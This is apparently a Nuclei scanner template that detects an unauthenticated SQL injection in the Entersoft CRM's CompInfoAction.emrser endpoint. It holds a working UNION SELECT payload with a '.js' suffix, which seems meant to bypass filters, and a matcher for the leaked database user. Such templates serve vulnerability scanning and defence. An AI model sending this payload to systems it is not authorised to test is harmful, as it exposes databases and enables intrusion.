id: entersoft-compInfoaction-sqli

info:
  name: 浙大恩特客户资源管理系统 CompInfoAction.emrser - SQL Injection
  author: qwtd
  severity: high
  description: |
    浙大恩特客户资源管理系统 CompInfoAction.emrser 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/hlERvPpK06nLNnPNfAYzLg
  tags: 浙大恩特客户资源管理系统


http:
  - raw:
      - |
        GET /entsoft/CompInfoAction.emrser;.js?compnum=1'+UNION+ALL+SELECT+user,NULL,NULL,NULL,NULL--+&method=selectCompBank HTTP/1.1
        Host: {{Hostname}}
  
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"date":[{"id":"DBA","adminflg":"","banknam":"","bankename":"","banknum":""}],"stat":1}'

      - type: status
        status:
          - 200